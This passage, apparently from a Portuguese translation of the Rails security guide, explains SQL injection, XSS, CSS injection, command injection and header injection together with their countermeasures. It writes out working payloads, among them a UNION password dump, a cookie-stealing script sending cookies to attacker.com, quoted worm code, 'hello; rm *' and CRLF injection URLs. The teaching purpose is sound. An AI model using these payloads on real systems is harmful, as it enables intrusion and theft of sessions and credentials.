Dependendo do seu aplicativo da web, pode haver mais maneiras de sequestrar a conta do usuário. Em muitos casos, CSRF e XSS ajudarão a fazer isso. Por exemplo, como em uma vulnerabilidade de CSRF no [Google Mail](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). Nesse ataque de prova de conceito, a vítima teria sido atraída para um site controlado pelo invasor. Nesse site, há uma tag IMG criada que resulta em uma solicitação GET HTTP que altera as configurações de filtro do Google Mail. Se a vítima estivesse conectada ao Google Mail, o invasor alteraria os filtros para encaminhar todos os e-mails para seu endereço de e-mail. Isso é quase tão prejudicial quanto sequestrar a conta inteira. Como medida de segurança, _reveja a lógica do seu aplicativo e elimine todas as vulnerabilidades de XSS e CSRF_.

### CAPTCHAs

INFO: _Um CAPTCHA é um teste de desafio-resposta para determinar que a resposta não é gerada por um computador. É frequentemente usado para proteger formulários de registro de ataques e formulários de comentários de bots de spam automáticos, solicitando ao usuário que digite as letras de uma imagem distorcida. Este é o CAPTCHA positivo, mas também existe o CAPTCHA negativo. A ideia de um CAPTCHA negativo não é para um usuário provar que é humano, mas revelar que um robô é um robô._

Uma API de CAPTCHA positivo popular é o [reCAPTCHA](https://developers.google.com/recaptcha/), que exibe duas imagens distorcidas de palavras de livros antigos. Ele também adiciona uma linha inclinada, em vez de um plano de fundo distorcido e altos níveis de deformação no texto, como os CAPTCHAs anteriores faziam, porque estes últimos foram quebrados. Como bônus, usar o reCAPTCHA ajuda a digitalizar livros antigos. O [reCAPTCHA](https://github.com/ambethia/recaptcha/) também é um plug-in do Rails com o mesmo nome da API.

Você receberá duas chaves da API, uma chave pública e uma chave privada, que você deve inserir no ambiente do Rails. Depois disso, você pode usar o método recaptcha_tags na visualização e o método verify_recaptcha no controlador. Verify_recaptcha retornará falso se a validação falhar.
O problema com os CAPTCHAs é que eles têm um impacto negativo na experiência do usuário. Além disso, alguns usuários com deficiência visual acham certos tipos de CAPTCHAs distorcidos difíceis de ler. Ainda assim, os CAPTCHAs positivos são um dos melhores métodos para evitar que todos os tipos de bots enviem formulários.

A maioria dos bots é realmente ingênua. Eles rastreiam a web e colocam seu spam em todos os campos de formulário que encontram. Os CAPTCHAs negativos se aproveitam disso e incluem um campo "isca" no formulário que será ocultado do usuário humano por CSS ou JavaScript.

Observe que os CAPTCHAs negativos são eficazes apenas contra bots ingênuos e não são suficientes para proteger aplicativos críticos de bots direcionados. Ainda assim, os CAPTCHAs negativos e positivos podem ser combinados para aumentar o desempenho, por exemplo, se o campo "isca" não estiver vazio (bot detectado), você não precisará verificar o CAPTCHA positivo, o que exigiria uma solicitação HTTPS ao Google ReCaptcha antes de calcular a resposta.

Aqui estão algumas ideias de como ocultar os campos de isca por JavaScript e/ou CSS:

* posicione os campos fora da área visível da página
* torne os elementos muito pequenos ou os coloque na mesma cor do plano de fundo da página
* deixe os campos visíveis, mas informe aos humanos para deixá-los em branco
O CAPTCHA negativo mais simples é um campo de armadilha oculto. No lado do servidor, você verificará o valor do campo: se ele contiver algum texto, deve ser um bot. Em seguida, você pode ignorar a postagem ou retornar um resultado positivo, mas não salvar a postagem no banco de dados. Dessa forma, o bot ficará satisfeito e seguirá em frente.

Você pode encontrar CAPTCHAs negativos mais sofisticados no post do blog de Ned Batchelder: [link](https://nedbatchelder.com/text/stopbots.html):

* Inclua um campo com o carimbo de data e hora UTC atual e verifique-o no servidor. Se estiver muito no passado ou no futuro, o formulário é inválido.
* Randomize os nomes dos campos
* Inclua mais de um campo de armadilha de todos os tipos, incluindo botões de envio

Observe que isso protege apenas contra bots automáticos, bots direcionados personalizados não podem ser impedidos por isso. Portanto, _CAPTCHAs negativos podem não ser bons para proteger formulários de login_.

### Registro

AVISO: _Informe ao Rails para não colocar senhas nos arquivos de log._

Por padrão, o Rails registra todas as solicitações feitas à aplicação web. Mas os arquivos de log podem ser um grande problema de segurança, pois podem conter credenciais de login, números de cartão de crédito, etc. Ao projetar um conceito de segurança para aplicação web, você também deve pensar no que acontecerá se um invasor obtiver acesso (total) ao servidor web. Criptografar segredos e senhas no banco de dados será bastante inútil se os arquivos de log os listarem em texto claro. Você pode _filtrar determinados parâmetros de solicitação de seus arquivos de log_ adicionando-os a [`config.filter_parameters`][] na configuração da aplicação. Esses parâmetros serão marcados como [FILTERED] no log.

```ruby
config.filter_parameters << :password
```

OBSERVAÇÃO: Os parâmetros fornecidos serão filtrados por meio de expressões regulares de correspondência parcial. O Rails adiciona uma lista de filtros padrão, incluindo `:passw`, `:secret` e `:token`, no inicializador apropriado (`initializers/filter_parameter_logging.rb`) para lidar com parâmetros típicos de aplicação, como `password`, `password_confirmation` e `my_token`.

### Expressões Regulares

INFORMAÇÃO: _Uma armadilha comum nas expressões regulares do Ruby é corresponder ao início e ao fim da string com ^ e $, em vez de \A e \z._

O Ruby usa uma abordagem um pouco diferente de muitas outras linguagens para corresponder ao final e ao início de uma string. É por isso que muitos livros de Ruby e Rails também cometem esse erro. Então, como isso se torna uma ameaça à segurança? Digamos que você queira validar de forma flexível um campo de URL e use uma expressão regular simples como esta:

```ruby
  /^https?:\/\/[^\n]+$/i
```

Isso pode funcionar bem em algumas linguagens. No entanto, _no Ruby, `^` e `$` correspondem ao início e ao fim da **linha**_. E, portanto, uma URL como essa passa pelo filtro sem problemas:

```
javascript:exploit_code();/*
http://hi.com
*/
```

Essa URL passa pelo filtro porque a expressão regular corresponde à segunda linha, o restante não importa. Agora imagine que tivéssemos uma visualização que mostrasse a URL assim:

```ruby
  link_to "Página inicial", @user.homepage
```

O link parece inofensivo para os visitantes, mas quando clicado, ele executará a função JavaScript "exploit_code" ou qualquer outro JavaScript fornecido pelo invasor.

Para corrigir a expressão regular, `\A` e `\z` devem ser usados em vez de `^` e `$`, assim:

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

Como esse é um erro frequente, o validador de formato (validates_format_of) agora gera uma exceção se a expressão regular fornecida começar com ^ ou terminar com $. Se você precisar usar ^ e $ em vez de \A e \z (o que é raro), você pode definir a opção :multiline como true, assim:

```ruby
  # o conteúdo deve incluir a linha "Meanwhile" em qualquer lugar da string
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

Observe que isso protege apenas contra o erro mais comum ao usar o validador de formato - você sempre precisa ter em mente que ^ e $ correspondem ao início e ao fim da **linha** no Ruby, e não ao início e ao fim de uma string.

### Escalação de Privilégios

AVISO: _Alterar um único parâmetro pode dar ao usuário acesso não autorizado. Lembre-se de que todos os parâmetros podem ser alterados, não importa o quanto você os esconda ou obfusque._

O parâmetro mais comum que um usuário pode adulterar é o parâmetro id, como em `http://www.domain.com/project/1`, em que 1 é o id. Ele estará disponível em params no controlador. Lá, você provavelmente fará algo assim:
```ruby
@project = Project.find(params[:id])
```

Isso está correto para algumas aplicações web, mas certamente não se o usuário não estiver autorizado a visualizar todos os projetos. Se o usuário alterar o id para 42 e não tiver permissão para ver essas informações, ele ainda terá acesso a elas. Em vez disso, _consulte também os direitos de acesso do usuário_:

```ruby
@project = @current_user.projects.find(params[:id])
```

Dependendo da sua aplicação web, haverá muitos outros parâmetros que o usuário pode manipular. Como regra geral, _nenhum dado de entrada do usuário é seguro, até que seja provado o contrário, e cada parâmetro do usuário é potencialmente manipulado_.

Não se deixe enganar pela segurança por obfuscação e pela segurança do JavaScript. As ferramentas de desenvolvedor permitem que você revise e altere todos os campos ocultos de um formulário. _O JavaScript pode ser usado para validar dados de entrada do usuário, mas certamente não para impedir que atacantes enviem solicitações maliciosas com valores inesperados_. O complemento Firebug para o Mozilla Firefox registra todas as solicitações e pode repeti-las e alterá-las. Essa é uma maneira fácil de contornar qualquer validação JavaScript. E existem até proxies do lado do cliente que permitem interceptar qualquer solicitação e resposta da Internet.

Injeção
---------

INFO: _Injeção é uma classe de ataques que introduzem código ou parâmetros maliciosos em uma aplicação web para executá-la dentro de seu contexto de segurança. Exemplos proeminentes de injeção são cross-site scripting (XSS) e injeção de SQL._

A injeção é muito complicada, porque o mesmo código ou parâmetro pode ser malicioso em um contexto, mas totalmente inofensivo em outro. Um contexto pode ser uma linguagem de script, consulta ou programação, o shell ou um método Ruby/Rails. As seções a seguir abordarão todos os contextos importantes onde os ataques de injeção podem ocorrer. No entanto, a primeira seção aborda uma decisão arquitetural em relação à injeção.

### Listas Permitidas Versus Listas Restritas

NOTA: _Ao sanitizar, proteger ou verificar algo, prefira listas permitidas em vez de listas restritas._

Uma lista restrita pode ser uma lista de endereços de e-mail ruins, ações não públicas ou tags HTML ruins. Isso é oposto a uma lista permitida que lista os endereços de e-mail bons, ações públicas, tags HTML boas, etc. Embora às vezes não seja possível criar uma lista permitida (em um filtro de SPAM, por exemplo), _prefira usar abordagens de lista permitida_:

* Use `before_action except: [...]` em vez de `only: [...]` para ações relacionadas à segurança. Dessa forma, você não esquece de habilitar verificações de segurança para ações recém-adicionadas.
* Permita `<strong>` em vez de remover `<script>` contra Cross-Site Scripting (XSS). Veja abaixo para mais detalhes.
* Não tente corrigir a entrada do usuário usando listas restritas:
    * Isso fará com que o ataque funcione: `"<sc<script>ript>".gsub("<script>", "")`
    * Mas rejeite entradas malformadas

Listas permitidas também são uma boa abordagem contra o fator humano de esquecer algo na lista restrita.

### Injeção de SQL

INFO: _Graças a métodos inteligentes, isso dificilmente é um problema na maioria das aplicações Rails. No entanto, esse é um ataque muito devastador e comum em aplicações web, por isso é importante entender o problema._

#### Introdução

Os ataques de injeção de SQL têm como objetivo influenciar consultas de banco de dados manipulando parâmetros de aplicação web. Um objetivo popular dos ataques de injeção de SQL é contornar a autorização. Outro objetivo é realizar manipulação de dados ou ler dados arbitrários. Aqui está um exemplo de como não usar dados de entrada do usuário em uma consulta:

```ruby
Project.where("name = '#{params[:name]}'")
```

Isso poderia estar em uma ação de pesquisa e o usuário pode inserir o nome de um projeto que deseja encontrar. Se um usuário malicioso inserir `' OR 1) --`, a consulta SQL resultante será:

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

Os dois traços iniciam um comentário ignorando tudo depois deles. Portanto, a consulta retorna todos os registros da tabela de projetos, incluindo aqueles que são invisíveis para o usuário. Isso ocorre porque a condição é verdadeira para todos os registros.

#### Contornando a Autorização

Normalmente, uma aplicação web inclui controle de acesso. O usuário insere suas credenciais de login e a aplicação web tenta encontrar o registro correspondente na tabela de usuários. A aplicação concede acesso quando encontra um registro. No entanto, um atacante pode possivelmente contornar essa verificação com injeção de SQL. O seguinte mostra uma consulta de banco de dados típica no Rails para encontrar o primeiro registro na tabela de usuários que corresponde aos parâmetros de credenciais de login fornecidos pelo usuário.
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

Se um invasor inserir `' OR '1'='1` como nome e `' OR '2'>'1` como senha, a consulta SQL resultante será:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

Isso simplesmente encontrará o primeiro registro no banco de dados e concederá acesso a esse usuário.

#### Leitura não autorizada

A instrução UNION conecta duas consultas SQL e retorna os dados em um conjunto. Um invasor pode usá-la para ler dados arbitrários do banco de dados. Vamos pegar o exemplo acima:

```ruby
Project.where("name = '#{params[:name]}'")
```

E agora vamos injetar outra consulta usando a instrução UNION:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

Isso resultará na seguinte consulta SQL:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

O resultado não será uma lista de projetos (porque não há projeto com nome vazio), mas uma lista de nomes de usuário e suas senhas. Portanto, espero que você [tenha criptografado as senhas de forma segura](#gerenciamento-de-usuários) no banco de dados! O único problema para o invasor é que o número de colunas deve ser o mesmo em ambas as consultas. É por isso que a segunda consulta inclui uma lista de uns (1), que sempre será o valor 1, para corresponder ao número de colunas na primeira consulta.

Além disso, a segunda consulta renomeia algumas colunas com a instrução AS para que a aplicação web exiba os valores da tabela de usuários. Certifique-se de atualizar seu Rails [para pelo menos a versão 2.1.1](https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html).

#### Contramedidas

O Ruby on Rails possui um filtro embutido para caracteres especiais do SQL, que escapará `'`, `"`, caractere NULL e quebras de linha. *Usar `Model.find(id)` ou `Model.find_by_something(something)` aplica automaticamente essa contramedida*. Mas em fragmentos de SQL, especialmente *em fragmentos de condições (`where("...")`), nos métodos `connection.execute()` ou `Model.find_by_sql()`, ela deve ser aplicada manualmente*.

Em vez de passar uma string, você pode usar manipuladores posicionais para sanitizar strings suspeitas, como este:

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

O primeiro parâmetro é um fragmento de SQL com pontos de interrogação. O segundo e terceiro parâmetro substituirão os pontos de interrogação pelo valor das variáveis.

Você também pode usar manipuladores nomeados, os valores serão obtidos do hash usado:

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

Além disso, você pode dividir e encadear condicionais válidos para o seu caso de uso:

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

Observe que as contramedidas mencionadas anteriormente estão disponíveis apenas em instâncias de modelos. Você pode tentar [`sanitize_sql`][] em outros lugares. _Transforme em hábito pensar nas consequências de segurança ao usar uma string externa no SQL_.


### Cross-Site Scripting (XSS)

INFO: _A vulnerabilidade de segurança mais difundida e uma das mais devastadoras em aplicações web é o XSS. Esse ataque malicioso injeta código executável do lado do cliente. O Rails fornece métodos auxiliares para se defender contra esses ataques._

#### Pontos de Entrada

Um ponto de entrada é uma URL vulnerável e seus parâmetros onde um invasor pode iniciar um ataque.

Os pontos de entrada mais comuns são postagens de mensagens, comentários de usuários e livros de visitas, mas títulos de projetos, nomes de documentos e páginas de resultados de pesquisa também podem ser vulneráveis - praticamente em qualquer lugar onde o usuário possa inserir dados. Mas a entrada não necessariamente precisa vir de caixas de entrada em sites, pode estar em qualquer parâmetro de URL - óbvio, oculto ou interno. Lembre-se de que o usuário pode interceptar qualquer tráfego. Aplicativos ou proxies do lado do cliente facilitam a alteração de solicitações. Também existem outros vetores de ataque, como anúncios em banner.

Os ataques XSS funcionam da seguinte maneira: um invasor injeta algum código, a aplicação web o salva e o exibe em uma página, posteriormente apresentada a uma vítima. A maioria dos exemplos de XSS simplesmente exibe uma caixa de alerta, mas ele é mais poderoso do que isso. O XSS pode roubar o cookie, sequestrar a sessão, redirecionar a vítima para um site falso, exibir anúncios em benefício do invasor, alterar elementos no site para obter informações confidenciais ou instalar software malicioso por meio de falhas de segurança no navegador da web.

Durante a segunda metade de 2007, foram relatadas 88 vulnerabilidades nos navegadores Mozilla, 22 no Safari, 18 no IE e 12 no Opera. O relatório de ameaças globais de segurança na Internet da Symantec também documentou 239 vulnerabilidades em plug-ins de navegador nos últimos seis meses de 2007. [Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/) é um framework de ataque muito ativo e atualizado que explora essas vulnerabilidades. Para hackers criminosos, é muito atraente explorar uma vulnerabilidade de injeção de SQL em um framework de aplicação web e inserir código malicioso em todas as colunas de tabela de texto. Em abril de 2008, mais de 510.000 sites foram invadidos dessa forma, incluindo o governo britânico, as Nações Unidas e muitos outros alvos de alto perfil.
#### Injeção de HTML/JavaScript

A linguagem de XSS mais comum é, é claro, a linguagem de script do lado do cliente mais popular, o JavaScript, muitas vezes em combinação com HTML. Escapar a entrada do usuário é essencial.

Aqui está o teste mais simples para verificar o XSS:

```html
<script>alert('Olá');</script>
```

Este código JavaScript simplesmente exibirá uma caixa de alerta. Os exemplos a seguir fazem exatamente a mesma coisa, apenas em lugares muito incomuns:

```html
<img src="javascript:alert('Olá')">
<table background="javascript:alert('Olá')">
```

##### Roubo de Cookies

Até agora, esses exemplos não causam nenhum dano, então vamos ver como um atacante pode roubar o cookie do usuário (e assim sequestrar a sessão do usuário). Em JavaScript, você pode usar a propriedade `document.cookie` para ler e gravar o cookie do documento. O JavaScript aplica a mesma política de mesma origem, o que significa que um script de um domínio não pode acessar cookies de outro domínio. A propriedade `document.cookie` contém o cookie do servidor web de origem. No entanto, você pode ler e gravar essa propriedade se incorporar o código diretamente no documento HTML (como acontece com o XSS). Injete isso em qualquer lugar de sua aplicação web para ver seu próprio cookie na página de resultado:

```html
<script>document.write(document.cookie);</script>
```

Para um atacante, é claro, isso não é útil, pois a vítima verá seu próprio cookie. O próximo exemplo tentará carregar uma imagem da URL http://www.attacker.com/ mais o cookie. Obviamente, essa URL não existe, então o navegador não exibe nada. Mas o atacante pode revisar os arquivos de log de acesso do seu servidor web para ver o cookie da vítima.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

Os arquivos de log em www.attacker.com serão lidos assim:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

Você pode mitigar esses ataques (de maneira óbvia) adicionando a flag **httpOnly** aos cookies, para que `document.cookie` não possa ser lido pelo JavaScript. Cookies somente HTTP podem ser usados a partir do IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 e Chrome 1.0.154 em diante. Mas outros navegadores mais antigos (como WebTV e IE 5.5 no Mac) podem realmente fazer com que a página falhe ao carregar. Esteja ciente de que os cookies [ainda serão visíveis usando Ajax](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly), no entanto.

##### Desfiguração

Com a desfiguração de páginas da web, um atacante pode fazer muitas coisas, por exemplo, apresentar informações falsas ou atrair a vítima para o site do atacante para roubar o cookie, credenciais de login ou outros dados sensíveis. A maneira mais popular é incluir código de fontes externas por meio de iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

Isso carrega HTML e/ou JavaScript arbitrários de uma fonte externa e os incorpora como parte do site. Este `iframe` foi retirado de um ataque real a sites italianos legítimos usando o [framework de ataque Mpack](https://isc.sans.edu/diary/MPack+Analysis/3015). O Mpack tenta instalar software malicioso por meio de falhas de segurança no navegador da web - com muito sucesso, 50% dos ataques têm êxito.

Um ataque mais especializado poderia sobrepor todo o site ou exibir um formulário de login que se parece com o original do site, mas transmite o nome de usuário e a senha para o site do atacante. Ou poderia usar CSS e/ou JavaScript para ocultar um link legítimo na aplicação web e exibir outro em seu lugar, que redireciona para um site falso.

Os ataques de injeção refletida são aqueles em que a carga útil não é armazenada para ser apresentada à vítima posteriormente, mas é incluída na URL. Especialmente os formulários de pesquisa falham ao escapar da string de pesquisa. O seguinte link apresentou uma página que afirmava que "George Bush nomeou um menino de 9 anos para ser o presidente...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Contramedidas

_É muito importante filtrar a entrada maliciosa, mas também é importante escapar a saída da aplicação web_.

Especialmente para XSS, é importante fazer uma filtragem de entrada permitida em vez de restrita. A filtragem de lista permitida declara os valores permitidos em oposição aos valores não permitidos. Listas restritas nunca estão completas.

Imagine uma lista restrita que exclui `"script"` da entrada do usuário. Agora, o atacante injeta `"<scrscriptipt>"` e, após a filtragem, `"<script>"` permanece. Versões anteriores do Rails usavam uma abordagem de lista restrita para os métodos `strip_tags()`, `strip_links()` e `sanitize()`. Portanto, esse tipo de injeção era possível:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

Isso retornava `"some<script>alert('hello')</script>"`, o que permite que o ataque funcione. Por isso, uma abordagem de lista permitida é melhor, usando o método `sanitize()` atualizado do Rails 2.
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

Isso permite apenas as tags fornecidas e faz um bom trabalho, mesmo contra todos os tipos de truques e tags malformadas.

Como segundo passo, _é uma boa prática escapar todas as saídas da aplicação_, especialmente ao reexibir a entrada do usuário, que não foi filtrada (como no exemplo do formulário de pesquisa anterior). _Use o método `html_escape()` (ou seu alias `h()`)_ para substituir os caracteres de entrada HTML `&`, `"`, `<` e `>` por suas representações não interpretadas em HTML (`&amp;`, `&quot;`, `&lt;` e `&gt;`).

##### Obfuscação e Injeção de Codificação

O tráfego de rede é baseado principalmente no alfabeto ocidental limitado, então surgiram novas codificações de caracteres, como o Unicode, para transmitir caracteres em outros idiomas. No entanto, isso também é uma ameaça para aplicativos da web, pois código malicioso pode ser ocultado em diferentes codificações que o navegador da web pode ser capaz de processar, mas o aplicativo da web pode não ser. Aqui está um vetor de ataque na codificação UTF-8:

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

Este exemplo exibe uma caixa de diálogo. No entanto, ele será reconhecido pelo filtro `sanitize()` acima. Uma ótima ferramenta para ofuscar e codificar strings, e assim "conhecer o seu inimigo", é o [Hackvertor](https://hackvertor.co.uk/public). O método `sanitize()` do Rails faz um bom trabalho para se proteger contra ataques de codificação.

#### Exemplos do Submundo

_Para entender os ataques atuais em aplicativos da web, é melhor dar uma olhada em alguns vetores de ataque do mundo real._

O seguinte é um trecho do [worm Js.Yamanner@m Yahoo! Mail](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa). Ele apareceu em 11 de junho de 2006 e foi o primeiro worm de interface de webmail:

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

Os worms exploram uma falha no filtro HTML/JavaScript do Yahoo, que normalmente filtra todos os atributos `target` e `onload` das tags (porque pode haver JavaScript). No entanto, o filtro é aplicado apenas uma vez, então o atributo `onload` com o código do worm permanece no lugar. Este é um bom exemplo de por que os filtros de lista restrita nunca são completos e por que é difícil permitir HTML/JavaScript em um aplicativo da web.

Outro worm de webmail de prova de conceito é o Nduja, um worm de domínio cruzado para quatro serviços de webmail italianos. Encontre mais detalhes no [artigo de Rosario Valotta](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Ambos os worms de webmail têm o objetivo de coletar endereços de e-mail, algo com o qual um hacker criminoso poderia ganhar dinheiro.

Em dezembro de 2006, 34.000 nomes de usuário e senhas reais foram roubados em um [ataque de phishing ao MySpace](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). A ideia do ataque era criar uma página de perfil chamada "login_home_index_html", para que a URL parecesse muito convincente. HTML e CSS especialmente criados foram usados para ocultar o conteúdo genuíno do MySpace da página e, em vez disso, exibir seu próprio formulário de login.

### Injeção de CSS

INFO: _A injeção de CSS é na verdade uma injeção de JavaScript, porque alguns navegadores (IE, algumas versões do Safari e outros) permitem JavaScript em CSS. Pense duas vezes antes de permitir CSS personalizado em seu aplicativo da web._

A injeção de CSS é explicada melhor pelo conhecido [worm MySpace Samy](https://samy.pl/myspace/tech.html). Este worm enviava automaticamente uma solicitação de amizade para Samy (o atacante) simplesmente visitando seu perfil. Em algumas horas, ele tinha mais de 1 milhão de solicitações de amizade, o que gerou tanto tráfego que o MySpace saiu do ar. A seguir, há uma explicação técnica desse worm.

O MySpace bloqueava muitas tags, mas permitia CSS. Então, o autor do worm colocou JavaScript no CSS da seguinte forma:

```html
<div style="background:url('javascript:alert(1)')">
```

Portanto, a carga útil está no atributo de estilo. Mas não são permitidas aspas na carga útil, porque as aspas simples e duplas já foram usadas. Mas o JavaScript tem uma função útil `eval()` que executa qualquer string como código.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

A função `eval()` é um pesadelo para filtros de entrada de lista restrita, pois permite que o atributo de estilo oculte a palavra "innerHTML":

```js
alert(eval('document.body.inne' + 'rHTML'));
```

O próximo problema foi o MySpace filtrar a palavra `"javascript"`, então o autor usou `"java<NEWLINE>script"` para contornar isso:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

Outro problema para o autor do worm foram os [tokens de segurança CSRF](#cross-site-request-forgery-csrf). Sem eles, ele não poderia enviar uma solicitação de amizade por POST. Ele contornou isso enviando um GET para a página logo antes de adicionar um usuário e analisando o resultado em busca do token CSRF.
No final, ele obteve um worm de 4 KB, que injetou em sua página de perfil.

A propriedade CSS [moz-binding](https://securiteam.com/securitynews/5LP051FHPE) provou ser outra maneira de introduzir JavaScript em CSS nos navegadores baseados em Gecko (como o Firefox, por exemplo).

#### Contramedidas

Este exemplo, mais uma vez, mostrou que um filtro de lista restrito nunca está completo. No entanto, como o CSS personalizado em aplicativos da web é um recurso bastante raro, pode ser difícil encontrar um bom filtro CSS permitido. _Se você deseja permitir cores ou imagens personalizadas, pode permitir que o usuário as escolha e construa o CSS no aplicativo da web_. Use o método `sanitize()` do Rails como modelo para um filtro CSS permitido, se você realmente precisar de um.

### Injeção de Textile

Se você deseja fornecer formatação de texto diferente de HTML (por motivos de segurança), use uma linguagem de marcação que seja convertida em HTML no lado do servidor. [RedCloth](http://redcloth.org/) é uma linguagem desse tipo para Ruby, mas sem precauções, também é vulnerável a XSS.

Por exemplo, o RedCloth traduz `_teste_` para `<em>teste<em>`, o que deixa o texto em itálico. No entanto, até a versão atual 3.0.4, ele ainda é vulnerável a XSS. Obtenha a [nova versão 4](http://www.redcloth.org) que removeu bugs graves. No entanto, mesmo essa versão possui [alguns bugs de segurança](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), então as contramedidas ainda se aplicam. Aqui está um exemplo para a versão 3.0.4:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Use a opção `:filter_html` para remover HTML que não foi criado pelo processador Textile.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

No entanto, isso não filtra todo o HTML, algumas tags serão mantidas (por design), por exemplo `<a>`:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Contramedidas

Recomenda-se _usar o RedCloth em combinação com um filtro de entrada permitido_, conforme descrito na seção de contramedidas contra XSS.

### Injeção de Ajax

NOTA: _As mesmas precauções de segurança devem ser tomadas para ações Ajax como para ações "normais". No entanto, há pelo menos uma exceção: a saída deve ser escapada no controlador, se a ação não renderizar uma visualização._

Se você usar o plugin [in_place_editor](https://rubygems.org/gems/in_place_editing), ou ações que retornem uma string em vez de renderizar uma visualização, _você deve escapar o valor de retorno na ação_. Caso contrário, se o valor de retorno contiver uma string XSS, o código malicioso será executado ao retornar para o navegador. Escape qualquer valor de entrada usando o método `h()`.

### Injeção de Linha de Comando

NOTA: _Use parâmetros de linha de comando fornecidos pelo usuário com cautela._

Se o seu aplicativo precisar executar comandos no sistema operacional subjacente, existem vários métodos em Ruby: `system(command)`, `exec(command)`, `spawn(command)` e `` `command` ``. Você terá que ter cuidado especial com essas funções se o usuário puder inserir o comando inteiro ou parte dele. Isso ocorre porque na maioria dos shells, você pode executar outro comando no final do primeiro, concatenando-os com um ponto e vírgula (`;`) ou uma barra vertical (`|`).

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# imprime "hello" e exclui arquivos no diretório atual
```

Uma contramedida é _usar o método `system(command, parameters)` que passa os parâmetros da linha de comando com segurança_.

```ruby
system("/bin/echo", "hello; rm *")
# imprime "hello; rm *" e não exclui arquivos
```

#### Vulnerabilidade do Kernel#open

`Kernel#open` executa um comando do sistema operacional se o argumento começar com uma barra vertical (`|`).

```ruby
open('| ls') { |file| file.read }
# retorna a lista de arquivos como uma String via comando `ls`
```

As contramedidas são usar `File.open`, `IO.open` ou `URI#open` em vez disso. Eles não executam um comando do sistema operacional.

```ruby
File.open('| ls') { |file| file.read }
# não executa o comando `ls`, apenas abre o arquivo `| ls` se existir

IO.open(0) { |file| file.read }
# abre a entrada padrão. não aceita uma String como argumento

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# abre o URI. `URI()` não aceita `| ls`
```

### Injeção de Cabeçalho

ATENÇÃO: _Os cabeçalhos HTTP são gerados dinamicamente e, em certas circunstâncias, a entrada do usuário pode ser injetada. Isso pode levar a redirecionamentos falsos, XSS ou divisão de resposta HTTP._

Os cabeçalhos de solicitação HTTP têm um campo Referer, User-Agent (software do cliente) e Cookie, entre outros. Os cabeçalhos de resposta, por exemplo, têm um código de status, Cookie e um campo Location (URL de destino de redirecionamento). Todos eles são fornecidos pelo usuário e podem ser manipulados com mais ou menos esforço. _Lembre-se de escapar esses campos de cabeçalho também_. Por exemplo, ao exibir o agente do usuário em uma área de administração.
Além disso, é _importante saber o que está fazendo ao construir cabeçalhos de resposta parcialmente baseados na entrada do usuário._ Por exemplo, se você deseja redirecionar o usuário de volta para uma página específica. Para fazer isso, você introduziu um campo "referer" em um formulário para redirecionar para o endereço fornecido:

```ruby
redirect_to params[:referer]
```

O que acontece é que o Rails coloca a string no campo de cabeçalho `Location` e envia um status 302 (redirecionamento) para o navegador. A primeira coisa que um usuário mal-intencionado faria é isso:

```
http://www.seuaplicativo.com/controlador/ação?referer=http://www.malicious.tld
```

E devido a um bug no (Ruby e) Rails até a versão 2.1.2 (excluindo-a), um hacker pode injetar campos de cabeçalho arbitrários; por exemplo, assim:

```
http://www.seuaplicativo.com/controlador/ação?referer=http://www.malicious.tld%0d%0aX-Header:+Oi!
http://www.seuaplicativo.com/controlador/ação?referer=caminho/no/seu/aplicativo%0d%0aLocation:+http://www.malicious.tld
```

